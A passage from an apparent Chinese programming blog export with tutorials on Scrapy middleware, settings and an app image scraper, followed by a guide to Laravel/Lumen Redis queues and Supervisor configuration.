，Scrapy将继续处理该request，执行其他的中间件的相应方法，直到合适的下载器处理函数(download handler)被调用， 该request被执行(其response被下载)。</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>如果其返回 Response 对象，Scrapy将不会调用 任何 其他的 process_request() 或 process_exception() 方法，或相应地下载函数； 其将返回该response。 已安装的中间件的 process_response() 方法则会在每个response返回时被调用。</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>如果其返回 Request 对象，Scrapy则停止调用 process_request方法并重新调度返回的request。当新返回的request被执行后， 相应地中间件链将会根据下载的response被调用。</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>如果其raise一个 IgnoreRequest 异常，则安装的下载中间件的 process_exception() 方法会被调用。如果没有任何一个方法处理该异常， 则request的errback(Request.errback)方法会被调用。如果没有代码处理抛出的异常， 则该异常被忽略且不记录(不同于其他异常那样)。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p>参数:</p>\n\n\t<ul><li><code>request (Request 对象)</code> – 处理的request</li>\n\t\t<li><code>spider (Spider 对象)</code> – 该request对应的spider</li>\n\t</ul></li>\n</ul><h3 id=\"processresponseself-request-response-spider\">process_response(self, request, response, spider)</h3>\n\n<p>当下载器完成http请求，传递响应给引擎的时候调用</p>\n\n<ul><li>\n\t<p>process_request() 必须返回以下其中之一: 返回一个 Response 对象、 返回一个 Request 对象或raise一个 IgnoreRequest 异常。</p>\n\n\t<ul><li>\n\t\t<p>如果其返回一个 Response (可以与传入的response相同，也可以是全新的对象)， 该response会被在链中的其他中间件的 process_response() 方法处理。</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>如果其返回一个 Request 对象，则中间件链停止， 返回的request会被重新调度下载。处理类似于 process_request() 返回request所做的那样。</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>如果其抛出一个 IgnoreRequest 异常，则调用request的errback(Request.errback)。 如果没有代码处理抛出的异常，则该异常被忽略且不记录(不同于其他异常那样)。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p>参数:</p>\n\n\t<ul><li><code>request (Request 对象)</code> – response所对应的request</li>\n\t\t<li><code>response (Response 对象)</code> – 被处理的response</li>\n\t\t<li><code>spider (Spider 对象)</code> – response所对应的spider</li>\n\t</ul></li>\n</ul><h2 id=\"使用案例：\">使用案例：</h2>\n\n<p>1. 创建<code>middlewares.py</code>文件。</p>\n\n<p>Scrapy代理IP、Uesr-Agent的切换都是通过<code>DOWNLOADER_MIDDLEWARES</code>进行控制，我们在<code>settings.py</code>同级目录下创建<code>middlewares.py</code>文件，包装所有请求。</p>\n\n<pre class=\"has\">\n<code># middlewares.py\n\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n\nimport random\nimport base64\n\nfrom settings import USER_AGENTS\nfrom settings import PROXIES\n\n# 随机的User-Agent\nclass RandomUserAgent(object):\n    def process_request(self, request, spider):\n        useragent = random.choice(USER_AGENTS)\n\n        request.headers.setdefault(\"User-Agent\", useragent)\n\nclass RandomProxy(object):\n    def process_request(self, request, spider):\n        proxy = random.choice(PROXIES)\n\n        if proxy['user_passwd'] is None:\n            # 没有代理账户验证的代理使用方式\n            request.meta['proxy'] = \"http://\" + proxy['ip_port']\n        else:\n            # 对账户密码进行base64编码转换\n            base64_userpasswd = base64.b64encode(proxy['user_passwd'])\n            # 对应到代理服务器的信令格式里\n            request.headers['Proxy-Authorization'] = 'Basic ' + base64_userpasswd\n            request.meta['proxy'] = \"http://\" + proxy['ip_port']\n</code></pre>\n\n<blockquote>\n<p>为什么HTTP代理要使用base64编码：</p>\n\n<p>HTTP代理的原理很简单，就是通过HTTP协议与代理服务器建立连接，协议信令中包含要连接到的远程主机的IP和端口号，如果有需要身份验证的话还需要加上授权信息，服务器收到信令后首先进行身份验证，通过后便与远程主机建立连接，连接成功之后会返回给客户端200，表示验证通过，就这么简单，下面是具体的信令格式：</p>\n</blockquote>\n\n<pre class=\"has\">\n<code>CONNECT 59.64.128.198:21 HTTP/1.1\nHost: 59.64.128.198:21\nProxy-Authorization: Basic bGV2I1TU5OTIz\nUser-Agent: OpenFetion\n</code></pre>\n\n<blockquote>\n<p>其中<code>Proxy-Authorization</code>是身份验证信息，Basic后面的字符串是用户名和密码组合后进行base64编码的结果，也就是对username:password进行base64编码。</p>\n</blockquote>\n\n<pre class=\"has\">\n<code>HTTP/1.0 200 Connection established\n</code></pre>\n\n<blockquote>\n<p>OK，客户端收到收面的信令后表示成功建立连接，接下来要发送给远程主机的数据就可以发送给代理服务器了，代理服务器建立连接后会在根据IP地址和端口号对应的连接放入缓存，收到信令后再根据IP地址和端口号从缓存中找到对应的连接，将数据通过该连接转发出去。</p>\n</blockquote>\n\n<p>2. 修改settings.py配置USER_AGENTS和PROXIES</p>\n\n<ul><li>添加USER_AGENTS：</li>\n</ul><pre class=\"has\">\n<code>　　USER_AGENTS = [\n    \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\",\n    \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\",\n    \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\",\n    \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\",\n    \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\",\n    \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\",\n    \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\",\n    \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\"\n    ]\n</code></pre>\n\n<ul><li>\n\t<p>添加代理IP设置PROXIES：</p>\n\n\t<p>免费代理IP可以网上搜索，或者付费购买一批可用的私密代理IP：</p>\n\t</li>\n</ul><pre class=\"has\">\n<code>PROXIES = [\n    {'ip_port': '111.8.60.9:8123', 'user_passwd': 'user1:pass1'},\n    {'ip_port': '101.71.27.120:80', 'user_passwd': 'user2:pass2'},\n    {'ip_port': '122.96.59.104:80', 'user_passwd': 'user3:pass3'},\n    {'ip_port': '122.224.249.122:8088', 'user_passwd': 'user4:pass4'},\n]\n</code></pre>\n\n<ul><li>除非特殊需要，禁用cookies，防止某些网站根据Cookie来封锁爬虫。</li>\n</ul><pre class=\"has\">\n<code>COOKIES_ENABLED = False\n</code></pre>\n\n<ul><li>设置下载延迟</li>\n</ul><pre class=\"has\">\n<code>DOWNLOAD_DELAY = 3\n</code></pre>\n\n<ul><li>最后设置setting.py里的DOWNLOADER_MIDDLEWARES，添加自己编写的下载中间件类。</li>\n</ul><pre class=\"has\">\n<code>DOWNLOADER_MIDDLEWARES = {\n    #'mySpider.middlewares.MyCustomDownloaderMiddleware': 543,\n    'mySpider.middlewares.RandomUserAgent': 1,\n    'mySpider.middlewares.ProxyMiddleware': 100\n}</code></pre>\n                                    </div>", "log_PostTime": 1584891235, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:Scrapy的settings", "log_Intro": "Python:Scrapy的settings", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"settings\">Settings</h1>\n\n<p>Scrapy设置(settings)提供了定制Scrapy组件的方法。可以控制包括核心(core)，插件(extension)，pipeline及spider组件。比如 设置Json Pipeliine、LOG_LEVEL等。</p>\n\n<p>参考文档：<a href=\"http://scrapy-chs.readthedocs.io/zh_CN/1.0/topics/settings.html#topics-settings-ref\" rel=\"nofollow\">http://scrapy-chs.readthedocs.io/zh_CN/1.0/topics/settings.html#topics-settings-ref</a></p>\n\n<h2 id=\"内置设置参考手册\">内置设置参考手册</h2>\n\n<ul><li>\n\t<p><code>BOT_NAME</code></p>\n\n\t<ul><li>\n\t\t<p>默认: 'scrapybot'</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>当您使用 startproject 命令创建项目时其也被自动赋值。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p><code>CONCURRENT_ITEMS</code></p>\n\n\t<ul><li>\n\t\t<p>默认: 100</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>Item Processor(即 Item Pipeline) 同时处理(每个response的)item的最大值。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p><code>CONCURRENT_REQUESTS</code></p>\n\n\t<ul><li>\n\t\t<p>默认: 16</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>Scrapy downloader 并发请求(concurrent requests)的最大值。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p><code>DEFAULT_REQUEST_HEADERS</code></p>\n\n\t<ul><li>\n\t\t<p>默认: 如下</p>\n\n\t\t<pre class=\"has\">\n<code>{\n'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n'Accept-Language': 'en',\n}\n</code></pre>\n\n\t\t<p>Scrapy HTTP Request使用的默认header。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p><code>DEPTH_LIMIT</code></p>\n\n\t<ul><li>\n\t\t<p>默认: 0</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>爬取网站最大允许的深度(depth)值。如果为0，则没有限制。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p><code>DOWNLOAD_DELAY</code></p>\n\n\t<ul><li>\n\t\t<p>默认: 0</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>下载器在下载同一个网站下一个页面前需要等待的时间。该选项可以用来限制爬取速度， 减轻服务器压力。同时也支持小数:</p>\n\t\t</li>\n\t</ul><p><code>DOWNLOAD_DELAY = 0.25 # 250 ms of delay</code></p>\n\n\t<ul><li>默认情况下，Scrapy在两个请求间不等待一个固定的值， 而是使用0.5到1.5之间的一个随机值 * DOWNLOAD_DELAY 的结果作为等待间隔。</li>\n\t</ul></li>\n\t<li>\n\t<p><code>DOWNLOAD_TIMEOUT</code></p>\n\n\t<ul><li>\n\t\t<p>默认: 180</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>下载器超时时间(单位: 秒)。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p><code>ITEM_PIPELINES</code></p>\n\n\t<ul><li>\n\t\t<p>默认: {}</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>保存项目中启用的pipeline及其顺序的字典。该字典默认为空，值(value)任意，不过值(value)习惯设置在0-1000范围内，值越小优先级越高。</p>\n\n\t\t<pre class=\"has\">\n<code>ITEM_PIPELINES = {\n'mySpider.pipelines.SomethingPipeline': 300,\n'mySpider.pipelines.ItcastJsonPipeline': 800,\n}\n</code></pre>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p><code>LOG_ENABLED</code></p>\n\n\t<ul><li>\n\t\t<p>默认: True</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>是否启用logging。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p><code>LOG_ENCODING</code></p>\n\n\t<ul><li>\n\t\t<p>默认: 'utf-8'</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>logging使用的编码。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p><code>LOG_LEVEL</code></p>\n\n\t<ul><li>\n\t\t<p>默认: 'DEBUG'</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>log的最低级别。可选的级别有: CRITICAL、 ERROR、WARNING、INFO、DEBUG 。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p><code>USER_AGENT</code></p>\n\n\t<ul><li>\n\t\t<p>默认: \"Scrapy/VERSION (+<a href=\"http://scrapy.org\" rel=\"nofollow\">http://scrapy.org</a>)\"</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>爬取的默认User-Agent，除非被覆盖。</p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p><code>PROXIES</code>： 代理设置</p>\n\n\t<ul><li>\n\t\t<p>示例：</p>\n\n\t\t<pre class=\"has\">\n<code>PROXIES = [\n  {'ip_port': '111.11.228.75:80', 'password': ''},\n  {'ip_port': '120.198.243.22:80', 'password': ''},\n  {'ip_port': '111.8.60.9:8123', 'password': ''},\n  {'ip_port': '101.71.27.120:80', 'password': ''},\n  {'ip_port': '122.96.59.104:80', 'password': ''},\n  {'ip_port': '122.224.249.122:8088', 'password':''},\n]\n</code></pre>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p><code>COOKIES_ENABLED = False</code></p>\n\n\t<ul><li>禁用Cookies</li>\n\t</ul></li>\n</ul>                                    </div>", "log_PostTime": 1584891236, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:Scrapy实战项目手机App抓包爬虫", "log_Intro": "Python:Scrapy实战项目手机App抓包爬虫", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>1. items.py</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">class DouyuspiderItem(scrapy.Item):\n    name = scrapy.Field()# 存储照片的名字\n    imagesUrls = scrapy.Field()# 照片的url路径\n    imagesPath = scrapy.Field()# 照片保存在本地的路径\n</code></pre>\n\n<p>2. spiders/douyu.py</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">import scrapy\nimport json\nfrom douyuSpider.items import DouyuspiderItem\n\nclass DouyuSpider(scrapy.Spider):\n    name = \"douyu\"\n    allowd_domains = [\"http://capi.douyucdn.cn\"]\n\n    offset = 0\n    url = \"http://capi.douyucdn.cn/api/v1/getVerticalRoom?limit=20&amp;offset=\"\n    start_urls = [url + str(offset)]\n\n  def parse(self, response):\n      # 返回从json里获取 data段数据集合\n      data = json.loads(response.text)[\"data\"]\n\n      for each in data:\n          item = DouyuspiderItem()\n          item[\"name\"] = each[\"nickname\"]\n          item[\"imagesUrls\"] = each[\"vertical_src\"]\n\n          yield item\n\n      self.offset += 20\n      yield scrapy.Request(self.url + str(self.offset), callback = self.parse)\n</code></pre>\n\n<p>3. 设置setting.py</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">\nITEM_PIPELINES = {'douyuSpider.pipelines.ImagesPipeline': 1}\n\n# Images 的存放位置，之后会在pipelines.py里调用\nIMAGES_STORE = \"/Users/Power/lesson_python/douyuSpider/Images\"\n\n# user-agent\nUSER_AGENT = 'DYZB/2.290 (iPhone; iOS 9.3.4; Scale/2.00)'\n</code></pre>\n\n<p>4. pipelines.py</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">import scrapy\nimport os\nfrom scrapy.pipelines.images import ImagesPipeline\nfrom scrapy.utils.project import get_project_settings\n\nclass ImagesPipeline(ImagesPipeline):\n    IMAGES_STORE = get_project_settings().get(\"IMAGES_STORE\")\n\n    def get_media_requests(self, item, info):\n        image_url = item[\"imagesUrls\"]\n        yield scrapy.Request(image_url)\n\n    def item_completed(self, results, item, info):\n        # 固定写法，获取图片路径，同时判断这个路径是否正确，如果正确，就放到 image_path里，ImagesPipeline源码剖析可见\n        image_path = [x[\"path\"] for ok, x in results if ok]\n\n        os.rename(self.IMAGES_STORE + \"/\" + image_path[0], self.IMAGES_STORE + \"/\" + item[\"name\"] + \".jpg\")\n        item[\"imagesPath\"] = self.IMAGES_STORE + \"/\" + item[\"name\"]\n\n        return item\n\n#get_media_requests的作用就是为每一个图片链接生成一个Request对象，这个方法的输出将作为item_completed的输入中的results，results是一个元组，每个元组包括(success, imageinfoorfailure)。如果success=true，imageinfoor_failure是一个字典，包括url/path/checksum三个key。\n</code></pre>\n\n<p>在项目根目录下新建main.py文件,用于调试</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">from scrapy import cmdline\ncmdline.execute('scrapy crawl douyu'.split())\n</code></pre>\n\n<p>执行程序</p>\n\n<pre class=\"has\">\n<code class=\"language-python\">py2 main.py</code></pre>\n                                    </div>", "log_PostTime": 1584891237, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Laravel/Lumen 使用 redis队列", "log_Intro": "Laravel/Lumen 使用 redis队列", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"articleHeader0\"><strong>一、概述</strong></h2>\n\n<p>在Web开发中，我们经常会遇到需要批量处理任务的场景，比如群发邮件、秒杀资格获取等，我们将这些耗时或者高并发的操作放到<code>队列中异步执行</code>可以有效缓解系统压力、提高系统响应速度和负载能力。</p>\n\n<h2 id=\"articleHeader1\"><strong>二、配置文件</strong></h2>\n\n<p>我们仍然从配置文件开始，首先我们需要在配置文件中配置默认队列驱动为Redis。lumen没有配置文件，可以从laravel项目中拷贝一份config目录过来。<br>\n队列配置文件是<code>config/queue.php</code>：</p>\n\n<pre class=\"has\">\n<code>return [\n\n    'default' =&gt; env('QUEUE_DRIVER', 'sync'),\n\n    'connections' =&gt; [\n        'database' =&gt; [\n            'driver' =&gt; 'database',\n            'table' =&gt; 'jobs',\n            'queue' =&gt; 'default',\n            'expire' =&gt; 60,\n        ],\n        'redis' =&gt; [\n            'driver' =&gt; 'redis',\n            'connection' =&gt; 'default',\n            'queue' =&gt; 'default',\n            'expire' =&gt; 60,\n        ],\n    ],\n\n    'failed' =&gt; [\n        'database' =&gt; 'mysql', 'table' =&gt; 'failed_jobs',\n    ],\n];</code></pre>\n\n<p>配置文件第一个配置项<code>default</code>用于指定默认的队列驱动，修改.env中的<code>QUEUE_DRIVER</code>即可。</p>\n\n<p><code>connections</code>配置项包含了Laravel支持的所有队列驱动，我们使用Redis驱动，所以需要配置redis项：<code>connection对应config/database.php中redis的default配置</code>；<code>queue</code>为默认队列名称；<code>expire</code>为队列任务过期时间（秒）。这里我们可以保持其默认配置不变。</p>\n\n<p><code>failed</code>配置项用于配置失败队列任务存放的数据库及数据表。这里我们需要按照自己的数据库配置对其做相应修改。</p>\n\n<p>要使用 redis 队列驱动，需要在配置文件 <code>config/database.php</code> 中配置 <code>Redis</code> 数据库连接。</p>\n\n<p>如果 Redis 队列连接使用 Redis Cluster（集群），队列名称必须包含 <code>key hash tag</code>，以确保给定队列对应的所有 Redis keys 都存放到同一个 <code>hash slot</code>：</p>\n\n<pre class=\"has\">\n<code>'redis' =&gt; [\n    'driver' =&gt; 'redis',\n    'connection' =&gt; 'default',\n    'queue' =&gt; '{default}',\n    'retry_after' =&gt; 90,\n],</code></pre>\n\n<blockquote>注：对一般中小型应用推荐使用 <code>Redis</code> 作为队列驱动。</blockquote>\n\n<h2 id=\"articleHeader2\"><strong>三、驱动预备知识</strong></h2>\n\n<p>数据库<br>\n要使用 <code>database</code> 队列驱动，你需要数据表保存任务信息（比如失败任务）。要生成创建这些表的迁移，可以在项目目录下运行 <code>Artisan</code> 命令 <code>queue:table</code>，迁移被创建之后，可以使用 <code>migrate</code> 命令生成这些表：</p>\n\n<pre class=\"has\">\n<code>php artisan queue:table\nphp artisan queue:failed_jobs\n\nphp artisan migrate\n</code></pre>\n\n<p>运行后生成<code>failed_jobs</code>、<code>jobs</code>、<code>migrations</code>三张表。</p>\n\n<h2 id=\"articleHeader3\"><strong>四、创建任务</strong></h2>\n\n<p><strong>1、生成任务类</strong></p>\n\n<p>通常，所有的任务类都保存在 <code>app/Jobs</code> 目录。<code>laravel</code>中 <code>app/Jobs</code> 不存在，在运行 <code>Artisan</code> 命令 <code>make:job</code> 的时候，它将会自动创建。你可以通过 Artisan CLI 来生成队列任务类：</p>\n\n<pre class=\"has\">\n<code>php artisan make:job ProcessPodcast\n</code></pre>\n\n<p>生成的类都实现了 <code>Illuminate\\Contracts\\Queue\\ShouldQueue</code> 接口, 告诉 Laravel 将该任务推送到队列，而不是立即运行：</p>\n\n<p><img alt=\"clipboard.png\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9iVmJidmhT?x-oss-process=image/format,png\"></p>\n\n<p><code>lumen</code>中 <code>app/Jobs</code>目录已经存在，由于不能执行artisan命令，直接复制目录中的<code>ExampleJob.php</code>即可。该文件继承<code>Job.php</code> 从而实现了<code>ShouldQueue</code>。</p>\n\n<p><img alt=\"clipboard.png\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9iVmJidml4?x-oss-process=image/format,png\"></p>\n\n<p><img alt=\"clipboard.png\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9iVmJidmla?x-oss-process=image/format,png\"></p>\n\n<p><img alt=\"clipboard.png\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9iVmJidmky?x-oss-process=image/format,png\"></p>\n\n<p><strong>2、任务类结构</strong></p>\n\n<p>任务类非常简单，通常只包含处理该任务的 <code>handle</code> 方法，在任务被处理的时候调用，注意我们可以在任务的 handle 方法中进行<code>依赖注入</code>。Laravel 服务容器会自动注入这些依赖。</p>\n\n<p><strong>3、分发任务</strong></p>\n\n<p>创建好任务类后，就可以通过任务自身的 <code>dispatch</code> 方法将其分发到队列。<code>dispatch</code> 方法需要的唯一参数就是该任务的实例:</p>\n\n<p><img alt=\"clipboard.png\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9iVmJidmt2?x-oss-process=image/format,png\"></p>\n\n<p>lumen中用法：</p>\n\n<p><img alt=\"clipboard.png\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2ltZy9iVmJidmxu?x-oss-process=image/format,png\"></p>\n\n<p><strong>4、指定最大失败次数</strong></p>\n\n<p>指定队列任务最大失败次数的一种实现方式是通过 Artisan 命令 <code>--tries</code> 切换：</p>\n\n<pre class=\"has\">\n<code>php artisan queue:work --tries=3\n</code></pre>\n\n<p>不过，你还可以在任务类自身定义最大失败次数来实现更加细粒度的控制，如果最大失败次数在任务中指定，则其<code>优先级高于命令行</code>指定的数值：</p>\n\n<pre class=\"has\">\n<code>   &lt;?php\n    \n    namespace App\\Jobs;\n    \n    class ProcessPodcast implements ShouldQueue\n    {\n        /**\n         * The number of times the job may be attempted.\n         *\n         * @var int\n         */\n        public $tries = 5;\n    }</code></pre>\n\n<p><strong>5、超时</strong></p>\n\n<blockquote>注：<code>timeout</code> 方法为 <code>PHP7.1+</code> 和 <code>pcntl</code> 扩展做了优化。</blockquote>\n\n<p>类似的，队列任务最大运行时长（秒）可以通过 Artisan 命令上的 <code>--timeout</code> 开关来指定：</p>\n\n<pre class=\"has\">\n<code>php artisan queue:work --timeout=30\n</code></pre>\n\n<p>同样，你也可以在任务类中定义该任务允许运行的最大时长（单位：秒），任务中指定的超时时间优先级也高于命令行定义的数值：</p>\n\n<pre class=\"has\">\n<code>&lt;?php\n\nnamespace App\\Jobs;\n\nclass ProcessPodcast implements ShouldQueue\n{\n    /**\n     * The number of seconds the job can run before timing out.\n     *\n     * @var int\n     */\n    public $timeout = 120;\n}</code></pre>\n\n<p><strong>6、基于时间的尝试次数</strong></p>\n\n<p>除了定义在任务失败前的最大尝试次数外，还可以定义在指定时间内允许任务的<code>最大尝试次数</code>，这可以通过在任务类中添加 <code>retryUntil</code> 方法来实现：</p>\n\n<pre class=\"has\">\n<code>/**\n * Determine the time at which the job should timeout.\n *\n * @return \\DateTime\n */\npublic function retryUntil()\n{\n    return now()-&gt;addSeconds(5);\n}</code></pre>\n\n<blockquote>注：还可以在队列时间监听器中定义 <code>retryUntil</code> 方法。</blockquote>\n\n<p><strong>7、频率限制</strong></p>\n\n<blockquote>注：该功能要求应用可以与 Redis 服务器进行交互。</blockquote>\n\n<p>如果应用使用了 <code>Redis</code>，那么可以使<code>用时间或并发</code>来控制队列任务。该功能特性在队列任务与有频率限制的 API 交互时很有帮助，例如，通过 <code>throttle</code> 方法，你可以限定给定类型任务每 60 秒只运行 10 次。如果不能获取锁，需要将任务释放回队列以便可以再次执行：</p>\n\n<pre class=\"has\">\n<code>Redis::throttle('key')-&gt;allow(10)-&gt;every(60)-&gt;then(function () {\n    // Job logic...\n}, function () {\n    // Could not obtain lock...\n\n    return $this-&gt;release(10);\n});</code></pre>\n\n<p>注：在上面的例子中，上面的方法可能无法找到，但是直接复制即可使用（具体还不清楚，知道的大神可以留言指教）。key 可以是任意可以唯一标识你想要限定访问频率的任务类型的字符串。举个例子，这个键可以基于任务类名和操作 Eloquent 模型的 ID 进行构建。</p>\n\n<p><strong>8、最大进程数量</strong></p>\n\n<p>除此之外，还可以指定可以同时处理给定任务的最大进程数量。这个功能在队列任务正在编辑一次只能由一个任务进行处理的资源时很有用。例如，使用 funnel 方法你可以给定类型任务一次只能由一个工作进程进行处理：</p>\n\n<pre class=\"has\">\n<code>Redis::funnel('key')-&gt;limit(1)-&gt;then(function () {\n    // Job logic...\n}, function () {\n    // Could not obtain lock...\n\n    return $this-&gt;release(10);\n});</code></pre>\n\n<blockquote>注：使用频率限制时，任务在运行成功之前需要的最大尝试次数很难权衡，因此，将频率限制和基于时间的尝试次数结合起来使用是个不错的选择。</blockquote>\n\n<p><strong>9、运行队列进程</strong></p>\n\n<p>Laravel 自带了一个队列进程用来处理被推送到队列的新任务。你可以使用 <code>queue:work</code> 命令运行这个队列进程。请注意，队列进程开始运行后，会持续监听队列，直至你手动停止或关闭终端：</p>\n\n<pre class=\"has\">\n<code>php artisan queue:work\n</code></pre>\n\n<blockquote>注：为了保持队列进程 <code>queue:work</code> 持续在后台运行，需要使用进程守护程序，比如 Supervisor 来确保队列进程持续运行。\n\n<p>简单处理可以使用 <code>php artisan queue:work --daemon &amp;</code></p>\n</blockquote>\n\n<p><strong>10、运行队列监听器</strong></p>\n\n<p>开始进行队列监听<br>\nlaravel 包含了一个 Artisan 命令来运行推送到队列中的任务的执行。你可以使用 <code>queue:listen</code> 命令来运行监听器：</p>\n\n<pre class=\"has\">\n<code>php artisan queue:listen\n</code></pre>\n\n<blockquote>注意：<code>queue:listen</code>要比<code>queue:work --daemon</code> 性能差很多。</blockquote>\n\n<p>你也可以指定监听哪一个连接的队列：</p>\n\n<pre class=\"has\">\n<code>php artisan queue:listen connection-name\n</code></pre>\n\n<hr><blockquote>请记住，<code>队列进程是长生命周期的进程，会在启动后驻留内存。若应用有任何改动将不会影响到已经启动的进程。所以请在发布程序后，重启队列进程</code>。</blockquote>\n\n<p>可以通过 Aritisan 命令 <code>queue:restart</code> 来优雅地重启队列进程:</p>\n\n<pre class=\"has\">\n<code>php artisan queue:restart\n</code></pre>\n\n<p>该命令将在队列进程完成正在进行的任务后，结束该进程，避免队列任务的丢失或错误。由于队列进程会在执行 <code>queue:restart</code> 命令后死掉，你仍然需要通过进程守护程序如 <code>Supervisor</code> 来自动重启队列进程。</p>\n\n<blockquote>注：队列使用缓存来存储重启信号，所以在使用此功能前你需要验证缓存驱动配置正确。</blockquote>\n\n<h2 id=\"articleHeader4\"><strong>五、配置 Supervisor</strong></h2>\n\n<ul><li><strong>安装 Supervisor</strong></li>\n</ul><p><code>Supervisor</code> 是 Linux 系统中常用的进程守护程序。如果队列进程 <code>queue:work</code> 意外关闭，它会自动重启启动队列进程。在 Ubuntu 安装Supervisor 非常简单：</p>\n\n<pre class=\"has\">\n<code>sudo apt-get install supervisor\n</code></pre>\n\n<blockquote>注：如果自己配置 Supervisor 有困难，可以考虑使用 Laravel Forge，它会为 Laravel 项目自动安装并配置 Supervisor。</blockquote>\n\n<ul><li><strong>配置 Supervisor</strong></li>\n</ul><p>Supervisor 配置文件通常存放在 <code>/etc/supervisor/conf.d</code> 目录，在该目录下，可以创建多个配置文件指示 Supervisor 如何监视进程，例如，让我们创建一个开启并监视 <code>queue:work</code> 进程的 <code>laravel-worker.conf</code> 文件：</p>\n\n<pre class=\"has\">\n<code>[program:laravel-worker]\nprocess_name=%(program_name)s_%(process_num)02d \ncommand= php /home/forge/app.com/artisan queue:work redis --sleep=3 --tries=3 --daemon\nautostart=true\nautorestart=true\nuser=forge\nnumprocs=8\nredirect_stderr=true\nstdout_logfile=/home/forge/app.com/worker.log</code></pre>\n\n<p>在本例中，<code>numprocs</code> 指令让 <code>Supervisor</code> 运行 8 个 <code>queue:work</code> 进程并监视它们，如果失败的话自动重启。当然，你需要修改 <code>queue:work sqs</code> 的 command 指令来映射你的队列连接。</p>\n\n<ul><li><code>启动 Supervisor</code></li>\n</ul><p>当成功创建配置文件后，需要刷新 <code>Supervisor</code> 的配置信息并使用如下命令启动进程:</p>\n\n<pre class=\"has\">\n<code>sudo supervisorctl reread\nsudo supervisorctl update\nsudo supervisorctl start laravel-worker:*</code></pre>\n\n<p>使用<code>top</code> 或者<code>ps aux | grep php</code> 命令可以看到启动的php进程。<br>\n你可以通过 <a href=\"http://supervisord.org/index.html\" rel=\"nofollow\">Supervisor</a> 官方文档获取更多信息。</p>\n\n<p>在<strong>CentOS</strong>中配置稍微有些区别：</p>\n\n<pre class=\"has\">\n<code>yum -y install python-setuptools\neasy_install supervisor\n</code></pre>\n\n<p>supervisor安装完成后会生成三个执行程序：</p>\n\n<blockquote><code>supervisortd</code> 